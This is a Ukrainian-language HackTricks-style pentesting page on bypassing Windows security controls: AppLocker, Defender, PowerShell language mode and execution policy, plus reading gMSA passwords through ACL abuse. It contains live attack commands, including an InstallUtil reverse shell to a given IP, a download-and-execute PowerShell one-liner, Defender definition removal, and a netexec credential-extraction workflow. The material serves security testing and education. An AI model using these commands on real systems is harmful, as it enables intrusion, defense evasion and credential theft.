# Контролі безпеки Windows

{{#include ../../banners/hacktricks-training.md}}

## Політика AppLocker

Білий список додатків — це перелік затверджених програм або виконуваних файлів, яким дозволено бути присутніми та запускатися в системі. Метою є захист середовища від шкідливого malware та незатвердженого програмного забезпечення, яке не відповідає конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) є рішенням Microsoft для реалізації **білого списку додатків** і дає системним адміністраторам контроль над **тим, які додатки та файли можуть запускати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами інсталятора Windows, DLL, упакованими додатками та інсталяторами упакованих додатків.\
Зазвичай організації **блокують cmd.exe та PowerShell.exe** і доступ на запис до певних директорій, **але все це можна обійти**.

### Check

Перевірте, які файли/розширення заблоковані або дозволені:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, і дозволяє переглянути поточний набір правил, що діють у системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Корисні **Writable folders** для bypass AppLocker Policy: Якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, існують **writable folders**, які ви можете використати, щоб **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Зазвичай **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) бінарні файли також можуть бути корисні для обходу AppLocker.
- **Неправильно написані правила також можуть бути обійдені**
- Наприклад, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, ви можете створити **папку з назвою `allowed`** будь-де і вона буде дозволена.
- Організації часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** через додаткове навантаження на систему та обсяг тестувань, необхідних щоб упевнитися, що нічого не зламається. Тому використання **DLLs як backdoors допоможе обійти AppLocker**.
- Ви можете використати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) щоб **execute Powershell** код в будь-якому процесі і обійти AppLocker. Для детальнішої інформації див.: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Локальні облікові дані присутні в цьому файлі, паролі збережені у хешованому вигляді.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
**LSA** адмініструє локальну **політику безпеки** (password policy, users permissions...), **authentication**, **access tokens**...\
LSA буде тим, хто **перевірятиме** надані облікові дані всередині файлу **SAM** (для локального входу) та **спілкуватиметься** з **domain controller** для аутентифікації доменного користувача.

The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

### LSA secrets

LSA може зберігати на диску деякі облікові дані:

- Пароль облікового запису комп'ютера Active Directory (коли контролер домену недоступний).
- Паролі облікових записів служб Windows
- Паролі для запланованих завдань
- Інше (пароль додатків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише на Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — антивірус, який доступний у Windows 10 та Windows 11, а також у версіях Windows Server. Він **блокує** поширені pentesting інструменти, такі як **`WinPEAS`**. Однак існують способи **обійти ці захисти**.

### Check

Щоб перевірити **стан** **Defender**, ви можете виконати PS cmdlet **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи активовано):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Для його перерахування також можна виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS захищає файли за допомогою шифрування, використовуючи симетричний ключ, відомий як File Encryption Key (FEK). Цей ключ зашифровано відкритим ключем користувача і зберігається в альтернативному потоці даних $EFS зашифрованого файлу. Коли потрібне розшифрування, відповідний приватний ключ цифрового сертифіката користувача використовується для розшифрування FEK з потоку $EFS. Детальніше можна прочитати [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без ініціації користувача** включають:

- Коли файли або папки переміщуються на файлову систему, яка не підтримує EFS, наприклад [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, відправлені мережею через протокол SMB/CIFS, розшифровуються перед передачею.

Цей метод шифрування дозволяє власнику мати **прозорий доступ** до зашифрованих файлів. Проте проста зміна пароля власника та вхід в обліковий запис не дозволять автоматично розшифрувати файли.

**Ключові моменти**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Розшифрування використовує приватний ключ користувача для доступу до FEK.
- Автоматичне розшифрування відбувається за певних умов, наприклад при копіюванні на FAT32 або під час мережевої передачі.
- Зашифровані файли доступні власнику без додаткових дій.

### Check EFS info

Перевірте, чи користувач використовував цю службу, перевіривши наявність шляху:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, хто має доступ до файлу, використавши cipher /c \<file\>  
Ви також можете використовувати `cipher /e` та `cipher /d` всередині папки, щоб **зашифрувати** та **розшифрувати** всі файли

### Decrypting EFS files

#### Отримання прав SYSTEM

Цей спосіб вимагає, щоб користувач-жертва виконував процес на хості. У цьому випадку, використовуючи meterpreter session, ви можете імітувати токен процесу користувача (impersonate_token з incognito). Або ви можете просто migrate до процесу користувача.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft розробила Group Managed Service Accounts (gMSA) для спрощення керування сервісними обліковими записами в IT-інфраструктурах. На відміну від традиційних сервісних облікових записів, у яких часто ввімкнено налаштування "**Password never expire**", gMSA пропонують більш безпечне та кероване рішення:

- **Automatic Password Management**: gMSA використовують складний 240-символьний пароль, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється службою розповсюдження ключів (KDC) Microsoft, що усуває потребу у ручному оновленні паролів.
- **Enhanced Security**: ці облікові записи не піддаються блокуванням і не можуть використовуватися для інтерактивного входу, що підвищує їхню безпеку.
- **Multiple Host Support**: gMSA можна використовувати на кількох хостах одночасно, що робить їх ідеальними для сервісів, що працюють на кількох серверах.
- **Scheduled Task Capability**: на відміну від Managed Service Accounts, gMSA підтримують запуск запланованих завдань.
- **Simplified SPN Management**: система автоматично оновлює Service Principal Name (SPN) при змінах у sAMAccount даних комп’ютера або імені DNS, спрощуючи керування SPN.

Паролі для gMSA зберігаються у властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (DC). Цей пароль, зашифрований бінарний обʼєкт відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), може бути отриманий лише авторизованими адміністраторами та серверами, на яких встановлено gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з’єднання, наприклад LDAPS, або з’єднання має бути аутентифіковане з параметрами 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Ви можете прочитати цей пароль за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Також перегляньте цю [web page](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack** щоб **зчитати** **пароль** **gMSA**.

### Зловживання ланцюгом ACL для зчитування керованого пароля gMSA (GenericAll -> ReadGMSAPassword)

У багатьох середовищах користувачі з низькими привілеями можуть отримати доступ до секретів gMSA без компрометації DC, зловживаючи некоректно налаштованими ACL об'єктів:

- A group you can control (e.g., via GenericAll/GenericWrite) is granted `ReadGMSAPassword` over a gMSA.
- Додавши себе до цієї групи, ви успадковуєте право зчитувати `msDS-ManagedPassword` blob gMSA через LDAP і отримувати придатні NTLM облікові дані.

Типовий робочий процес:

1) Discover the path with BloodHound and mark your foothold principals as Owned. Look for edges like:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Add yourself to the intermediate group you control (example with bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Прочитайте керований пароль gMSA через LDAP і отримайте NTLM-хеш. NetExec автоматизує витяг `msDS-ManagedPassword` та перетворення в NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
Аутентифікуйтеся як gMSA, використовуючи NTLM hash (no plaintext needed). Якщо обліковий запис у Remote Management Users, WinRM працюватиме безпосередньо:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Примітки:
- Читання LDAP атрибуту `msDS-ManagedPassword` вимагає sealing (наприклад, LDAPS/sign+seal). Інструменти обробляють це автоматично.
- gMSAs часто мають надані локальні права, такі як WinRM; перевірте членство в групах (наприклад, Remote Management Users), щоб планувати lateral movement.
- Якщо вам потрібен лише blob для обчислення NTLM самостійно, див. структуру MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дозволяє керувати локальними паролями облікового запису Administrator. Ці паролі — **рандомізовані**, унікальні й **регулярно змінювані** — зберігаються централізовано в Active Directory. Доступ до цих паролів обмежено через ACLs лише для авторизованих користувачів. При наданні достатніх прав можна читати локальні паролі адміністратора.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато можливостей**, необхідних для ефективного використання PowerShell, таких як блокування COM objects, дозвіл лише затверджених .NET types, XAML-based workflows, PowerShell classes та інше.

### **Перевірити**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Обхід
```bash
#Easy bypass
Powershell -version 2
```
У сучасних Windows цей Bypass не працює, але ви можете використати[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Щоб скомпілювати його, можливо, потрібно** **виконати** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проект на .Net4.5**.

#### Прямий bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) щоб **execute Powershell** code в будь-якому процесі та обійти constrained mode. Для детальнішої інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Політика виконання PS

За замовчуванням вона встановлена як **restricted.** Основні способи обійти цю політику:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Інтерфейс Security Support Provider (SSPI)

Є API, який може використовуватися для автентифікації користувачів.

SSPI відповідатиме за вибір відповідного протоколу для двох машин, що хочуть обмінюватися даними. Переважним методом для цього є Kerberos. Далі SSPI узгоджуватиме, який протокол автентифікації буде використано; ці протоколи називаються Security Support Provider (SSP), розміщені в кожній Windows-машині у вигляді DLL, і обидві машини повинні підтримувати один і той самий, щоб мати змогу обмінюватися даними.

### Основні SSP

- **Kerberos**: Переважний
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: З міркувань сумісності
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Веб‑сервери та LDAP, пароль у вигляді MD5-хеша
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL та TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Використовується для узгодження протоколу (Kerberos або NTLM, за замовчуванням — Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### Узгодження може запропонувати кілька методів або лише один.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка вмикає **запит на дозвіл для підвищених дій**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Посилання

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
